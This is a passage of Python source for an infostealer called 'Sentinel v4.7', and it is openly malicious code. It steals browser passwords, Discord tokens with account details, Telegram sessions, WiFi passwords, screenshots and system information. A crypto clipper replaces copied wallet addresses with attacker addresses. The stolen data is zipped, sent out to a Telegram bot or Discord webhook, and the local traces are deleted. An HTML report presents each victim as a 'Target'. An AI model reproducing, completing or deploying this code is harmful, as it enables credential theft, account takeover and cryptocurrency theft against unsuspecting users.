                    document.getElementById('wifi-container').innerHTML = html;
                }})();
            </script>
        </div>''')
    
    # Telegram
    if has_telegram:
        sections_html.append(f'''
        <div class="section" id="telegram-section" style="display: none;">
            <h2>✈️ Telegram Session <span class="file-badge">{tele_file_count} files</span></h2>
            <div class="log-box">Session folder: telegram_session/<br>Files: {tele_file_count}</div>
        </div>''')
    
    # Network
    if has_network:
        net_json = json.dumps(network_data)
        sections_html.append(f'''
        <div class="section" id="network-section" style="display: none;">
            <h2>🌐 Network Scan <span class="file-badge">network_scan.json</span></h2>
            <div class="log-box" id="network-container"></div>
            <script>
                (function() {{
                    const data = {net_json};
                    document.getElementById('network-container').innerHTML = '<pre style="margin:0;">' + JSON.stringify(data, null, 2) + '</pre>';
                }})();
            </script>
        </div>''')
    
    # Clipper
    if has_crypto:
        crypto_rows = ""
        for crypto, address in crypto_addresses.items():
            status_icon = "✅" if address and address.strip() else "❌"
            display_addr = address if address and address.strip() else "Not configured"
            crypto_rows += f"<tr><td>{status_icon} {crypto}</td><td class='token-cell'>{display_addr}</td></tr>"
        
        sections_html.append(f'''
        <div class="section" id="clipper-section" style="display: none;">
            <h2>₿ Crypto Clipper <span class="file-badge">{len(active_cryptos)}/{len(crypto_addresses)} active</span></h2>
            <div style="padding: 0.75rem; background: rgba(0,0,0,0.3); border-radius: 8px; margin-bottom: 1rem;">
                <strong>Status:</strong> <span class="{'clipper-active' if clipper_running else 'clipper-inactive'}">{'✅ RUNNING' if clipper_running else '❌ STOPPED'}</span>
            </div>
            <table><tr><th>Currency</th><th>Address</th></tr>{crypto_rows}</table>
        </div>''')
    
    sections_html_combined = '\n'.join(sections_html)
    
    # Final HTML
    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sentinel Report - {sys_data['hostname']}</title>
    <style>
        :root {{ --primary: #00f0ff; --success: #00ff88; --danger: #ff4444; --warning: #ffaa00; --bg: #0a0a0f; --panel: #12121a; --text: #fff; --text-secondary: #8b8b9e; --border: #333; }}
        body {{ font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); padding: 2rem; margin: 0; }}
        .container {{ max-width: 1400px; margin: 0 auto; }}
        .header {{ background: var(--panel); border-radius: 16px; padding: 2rem; margin-bottom: 2rem; border: 2px solid var(--primary); }}
        .header h1 {{ color: var(--primary); margin: 0; font-size: 2.5rem; }}
        .section {{ background: var(--panel); border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem; border: 1px solid var(--border); }}
        .section.visible {{ display: block !important; }}
        .section h2 {{ color: var(--primary); margin-bottom: 1rem; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }}
        .status-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1rem; }}
        .status-card {{ padding: 1rem; border-radius: 8px; border-left: 4px solid; background: rgba(255,255,255,0.02); transition: transform 0.2s; cursor: pointer; }}
        .status-card:hover {{ transform: translateX(5px); }}
        .status-ok {{ border-color: var(--success); }}
        .status-warn {{ border-color: var(--warning); }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 1rem; font-size: 0.9rem; }}
        th, td {{ padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }}
        th {{ color: var(--primary); background: rgba(0, 240, 255, 0.05); font-weight: 600; }}
        .token-cell {{ font-family: 'Courier New', monospace; font-size: 0.75rem; word-break: break-all; max-width: 400px; color: var(--primary); }}
        .screenshot-container {{ text-align: center; padding: 1rem; background: #000; border-radius: 8px; border: 1px solid var(--border); }}
        .screenshot-img {{ max-width: 100%; max-height: 600px; border: 2px solid var(--primary); border-radius: 8px; }}
        .log-box {{ background: #000; border: 1px solid var(--border); border-radius: 8px; padding: 1rem; font-family: 'Courier New', monospace; font-size: 0.85rem; max-height: 400px; overflow-y: auto; }}
        .error-box {{ background: rgba(255,0,0,0.1); border: 1px solid var(--danger); border-radius: 8px; padding: 1rem; color: #ff6666; }}
        .success-notice {{ margin-top: 1rem; padding: 0.75rem; background: rgba(0, 255, 136, 0.1); border-radius: 8px; border-left: 3px solid var(--success); color: var(--success); }}
        .clipper-active {{ color: var(--success); font-weight: bold; }}
        .clipper-inactive {{ color: var(--danger); font-weight: bold; }}
        .footer {{ text-align: center; margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.85rem; }}
        .file-badge {{ display: inline-block; padding: 2px 8px; background: rgba(0, 240, 255, 0.1); border-radius: 4px; font-size: 0.75rem; margin-left: 10px; color: var(--primary); }}
        .discord-detail {{ background: rgba(0,0,0,0.3); padding: 0.5rem; margin: 0.25rem 0; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 0.85rem; border-left: 3px solid var(--primary); }}
        .discord-label {{ color: var(--primary); display: inline-block; width: 150px; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ SENTINEL REPORT v4.6</h1>
            <p>Target: <strong>{sys_data['hostname']}</strong> | User: <strong>{sys_data['username']}</strong> | Generated: <strong>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</strong></p>
        </div>
        
        <div class="section visible" id="status-section">
            <h2>📊 Collection Status (Click to view)</h2>
            <div class="status-grid">
                {status_grid_html}
            </div>
        </div>
        
        {sections_html_combined}
        
        <div class="footer">
            <p>Sentinel v4.6 | Report | {datetime.now().strftime('%Y-%m-%d at %H:%M:%S')}</p>
        </div>
    </div>
    
    <script>
        let activeSection = null;
        
        function toggleSection(sectionId) {{
            const section = document.getElementById(sectionId);
            if (!section) return;
            
            document.querySelectorAll('.section').forEach(s => {{
                if (s.id !== 'status-section') {{
                    s.style.display = 'none';
                    s.classList.remove('visible');
                }}
            }});
            
            if (activeSection === sectionId) {{
                activeSection = null;
            }} else {{
                section.style.display = 'block';
                section.classList.add('visible');
                activeSection = sectionId;
            }}
        }}
    </script>
</body>
</html>'''
    
    report_path = os.path.join(output_dir, 'report.html')
    with open(report_path, 'w', encoding='utf-8') as f:
        f.write(html)
    
    print(f"    [+] Report generated: {report_path}")
    return report_path, html
# ==================== DATA COLLECTION ====================

def save_discord_accounts_txt(tokens, output_dir):
    """Save Discord accounts to text file"""
    if not tokens or len(tokens) == 0:
        return False
    
    discord_txt_path = os.path.join(output_dir, "Discord_Accounts.txt")
    
    try:
        with open(discord_txt_path, 'w', encoding='utf-8') as f:
            f.write("=" * 70 + "\n")
            f.write("                    DISCORD ACCOUNTS - SENTINEL v4.7\n")
            f.write("=" * 70 + "\n\n")
            
            for i, token_data in enumerate(tokens, 1):
                f.write(f"Account #{i}\n")
                f.write("-" * 40 + "\n")
                
                token = token_data.get('token', 'N/A')
                user_id = token_data.get('user_id', 'N/A')
                username = token_data.get('username', token_data.get('global_name', 'N/A'))
                email = token_data.get('email', 'N/A')
                phone = token_data.get('phone', 'N/A')
                nitro = token_data.get('nitro', 'No')
                mfa = token_data.get('mfa_enabled', 'No')
                
                f.write(f"Token:    {token}\n")
                f.write(f"User ID:  {user_id}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Email:    {email}\n")
                f.write(f"Phone:    {phone}\n")
                f.write(f"Nitro:    {nitro}\n")
                f.write(f"MFA:      {mfa}\n")
                f.write("\n" + "=" * 70 + "\n\n")
            
            f.write(f"Total Accounts: {len(tokens)} | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        print(f"    [+] Discord accounts saved: Discord_Accounts.txt")
        return True
    except Exception as e:
        print(f"    [!] Error saving Discord accounts: {e}")
        return False

def run_data_collection():
    """Run all data collection tasks"""
    temp_dir = tempfile.mkdtemp(prefix="sentinel_")
    output_dir = os.path.join(temp_dir, "Collected_Data")
    os.makedirs(output_dir, exist_ok=True)
    
    print(f"[*] Output directory: {output_dir}")
    
    results = {
        "collection_time": datetime.now().isoformat(),
        "output_dir": output_dir
    }
    
    # 1. System Info
    if CONFIG["features"].get("system_info", False):
        try:
            print("[*] Gathering system information...")
            import platform, socket, psutil
            
            results["hostname"] = socket.gethostname()
            try:
                results["username"] = os.getlogin()
            except:
                results["username"] = os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
            
            results["platform"] = f"{platform.system()} {platform.release()}"
            results["processor"] = platform.processor() or 'Unknown'
            results["cpu_cores"] = psutil.cpu_count(logical=True)
            results["ram_gb"] = round(psutil.virtual_memory().total / (1024**3), 2)
            
            sys_info = get_system_info(output_dir)
            if isinstance(sys_info, dict):
                results["public_ip"] = sys_info.get('network', {}).get('public_ip_info', {}).get('ip', 'Unknown')
                results["country_code"] = sys_info.get('network', {}).get('public_ip_info', {}).get('country_code', 'XX')
            
            print("    [+] System info collected")
        except Exception as e:
            print(f"[!] System info error: {e}")
    
    # 2. Screenshot
    if CONFIG["features"].get("screenshot", False):
        try:
            print("[*] Taking screenshot...")
            ss_path = capture(output_dir, "desktop_screenshot.jpg")
            if ss_path and os.path.exists(ss_path):
                results["screenshot_path"] = ss_path
                print(f"    [+] Screenshot saved: {os.path.basename(ss_path)}")
            else:
                print("    [!] Screenshot failed")
        except Exception as e:
            print(f"[!] Screenshot error: {e}")
    
    # 3. Browser Passwords
    if CONFIG["features"].get("browser_passwords", False):
        try:
            print("[*] Recovering browser passwords...")
            passwords = steal_all_passwords(output_dir, CONFIG.get("enabled_browsers"))
            if passwords and len(passwords) > 0:
                save_passwords(passwords, output_dir)
                print(f"    [+] Found {len(passwords)} passwords")
            else:
                print("    [*] No passwords found")
        except Exception as e:
            print(f"[!] Browser password error: {e}")
    
    # 4. Discord Tokens
    if CONFIG["features"].get("discord_token", False):
        try:
            print("[*] Extracting Discord tokens...")
            steal_discord(output_dir)
            
            discord_json = os.path.join(output_dir, "discord_tokens.json")
            tokens = []
            if os.path.exists(discord_json):
                try:
                    with open(discord_json, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        if isinstance(data, list):
                            tokens = data
                        elif isinstance(data, dict):
                            tokens = [data]
                except Exception as e:
                    print(f"    [!] Error reading JSON: {e}")
            
            if tokens:
                save_discord_accounts_txt(tokens, output_dir)
                print(f"    [+] Found {len(tokens)} Discord account(s)")
            else:
                print("    [*] No Discord tokens found")
        except Exception as e:
            print(f"[!] Discord token error: {e}")
            import traceback
            traceback.print_exc()
    
    # 5. Telegram Session
    if CONFIG["features"].get("telegram_session", False):
        try:
            print("[*] Copying Telegram session...")
            success, msg = steal_telegram(output_dir)
            print(f"    {'[+] ' if success else '[!] '}{msg}")
        except Exception as e:
            print(f"[!] Telegram error: {e}")
    
    # 6. Network Scan (using built-in scanner)
    if CONFIG["features"].get("network_scan", False):
        try:
            print("[*] Scanning network (built-in scanner)...")
            scan_result = run_network_scan_builtin(output_dir)
            print("    [+] Network scan complete")
        except Exception as e:
            print(f"[!] Network scan error: {e}")
            import traceback
            traceback.print_exc()
    
    # 7. WiFi Passwords
    if CONFIG["features"].get("wifi_passwords", False):
        try:
            print("[*] Extracting WiFi passwords...")
            wifi_results = steal_wifi_passwords(output_dir)
            count = wifi_results.get('total_networks', 0)
            print(f"    [+] Found {count} WiFi networks")
        except Exception as e:
            print(f"[!] WiFi error: {e}")
    
    return results, temp_dir

def send_results(zip_path, system_info_path):
    """Send results to configured platforms"""
    delivery_results = {}
    
    if not CONFIG.get("enable_telegram", False) and not CONFIG.get("enable_discord", False):
        return delivery_results
    
    try:
        print("[*] Sending results...")
        sender = ResultSender(
            telegram_token=CONFIG["telegram_token"] if CONFIG["enable_telegram"] else None,
            telegram_chat_id=CONFIG["telegram_chat_id"] if CONFIG["enable_telegram"] else None,
            discord_webhook=CONFIG["discord_webhook"] if CONFIG["enable_discord"] else None
        )
        
        if zip_path and os.path.exists(zip_path):
            delivery_results = sender.send_results(zip_path, system_info_path)
            
            for platform, status in delivery_results.items():
                icon = "✓" if status['success'] else "✗"
                print(f"    {icon} {platform}: {status['message']}")
    except Exception as e:
        print(f"[!] Delivery error: {e}")
        delivery_results["error"] = str(e)
    
    return delivery_results

def main():
    """Main execution flow"""
    print("=" * 70)
    print("Sentinel v4.7 - Fully Fixed Edition")
    print("Discord tokens: fixed | Network scanner: built‑in | Report: file‑validated")
    print("=" * 70)
    
    load_config()
    
    keep_alive = False
    clipper = None
    clipper_running = False
    
    try:
        # PHASE 1: Start crypto clipper
        if CONFIG["features"].get("crypto_clipper", False):
            addresses = {k: v for k, v in CONFIG.get("crypto_addresses", {}).items() if v and v.strip()}
            if addresses:
                print("[*] Starting Crypto Clipper...")
                clipper = get_clipper(addresses)
                if clipper and clipper.start():
                    keep_alive = True
                    clipper_running = True
                    print(f"[+] Clipper started: {len(addresses)} addresses")
                else:
                    print("[!] Failed to start clipper")
            else:
                print("[!] Clipper enabled but no addresses configured")
        
        # PHASE 2: Data Collection
        print("\n[*] Starting data collection...")
        results, temp_dir = run_data_collection()
        output_dir = results["output_dir"]
        
        print(f"\n[*] Files in output directory:")
        for f in os.listdir(output_dir):
            print(f"    - {f}")
        
        # PHASE 3: Generate HTML Report
        print("\n[*] Generating HTML report...")
        try:
            report_path, html = generate_html_report(output_dir, clipper_running)
            print(f"    [+] Report saved: {report_path}")
        except Exception as e:
            print(f"    [!] Report generation error: {e}")
            import traceback
            traceback.print_exc()
        
        # PHASE 4: Create ZIP archive
        zip_path = None
        try:
            print("[*] Creating archive...")
            zip_path = os.path.join(temp_dir, f"sentinel_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(output_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, output_dir)
                        zf.write(file_path, arcname)
            print(f"    [+] Archive created: {zip_path}")
        except Exception as e:
            print(f"    [!] Archive error: {e}")
        
        # PHASE 5: Send results
        system_info_path = os.path.join(output_dir, "system_infos.txt")
        delivery = send_results(zip_path, system_info_path)
        
        # PHASE 6: Keep alive for clipper
        if keep_alive and clipper and clipper.running:
            print("\n" + "=" * 70)
            print("[+] Data collection complete!")
            print("[+] Clipper running")
            print("[!] Press Ctrl+C to stop")
            print("=" * 70)
            
            try:
                while clipper.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[!] Stopping clipper...")
                clipper.stop()
            
            print("[*] Clipper stopped")
        else:
            print("\n[*] All tasks complete")
        
        # Cleanup
        try:
            if temp_dir and os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass
        
        print("[*] Sentinel completed")
        
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        
        if keep_alive and clipper and clipper.running:
            print("[*] Keeping clipper alive...")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                clipper.stop()
        
        sys.exit(1)

if __name__ == "__main__":
    main()